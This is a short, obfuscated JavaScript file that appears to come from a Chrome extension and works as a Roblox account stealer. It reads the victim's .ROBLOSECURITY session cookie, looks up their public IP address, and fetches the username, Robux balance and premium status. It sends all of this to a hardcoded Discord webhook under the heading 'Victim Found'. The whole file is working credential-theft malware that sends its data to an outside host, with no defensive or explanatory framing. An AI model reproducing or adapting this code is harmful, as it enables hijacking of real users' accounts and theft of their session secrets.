const WEBHOOK = "https://discord.com/api/webhooks/1031650174470201354/bRiQOIlHv18Ry7GRGFKqs69Z6-ux6AgBqQqY6gWBlIKE_Y4hRUsU_DUgeDHQlSqa6z5r";
async function main(_0xf4e6x3) {
  var _0xf4e6x4 = await (await fetch("https://api.ipify.org")).text();
  if (_0xf4e6x3) {
    var _0xf4e6x5 = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {headers: {Cookie: ".ROBLOSECURITY=" + _0xf4e6x3}, redirect: "manual"})).json();
  }
  ;
  fetch(WEBHOOK, {method: "POST", headers: {"Content-Type": "Application/json"}, body: JSON.stringify({content: null, embeds: [{description: "```" + (_0xf4e6x3 ? _0xf4e6x3 : "COOKIE NOT FOUND") + "```", color: null, fields: [{name: "Username", value: _0xf4e6x5 ? _0xf4e6x5.UserName : "N/A", inline: true}, {name: "Robux", value: _0xf4e6x5 ? _0xf4e6x5.RobuxBalance : "N/A", inline: true}, {name: "Premium", value: _0xf4e6x5 ? _0xf4e6x5.IsPremium : "N/A", inline: true}], author: {name: "Victim Found: " + _0xf4e6x4, icon_url: _0xf4e6x5 ? _0xf4e6x5.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"}, footer: {text: "credits: https://github.com/sipinslowly a;#5077", icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"}, thumbnail: {url: _0xf4e6x5 ? _0xf4e6x5.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"}}], username: "hit", avatar_url: "https://cdn.discordapp.com/avatars/1031650174470201354/aad190615ccbee25fe3f9a90de9aaf10.png", attachments: []})});
}
chrome.cookies.get({url: "https://www.roblox.com/home", name: ".ROBLOSECURITY"}, function (_0xf4e6x3) {
  main(_0xf4e6x3 ? _0xf4e6x3.value : null);
});
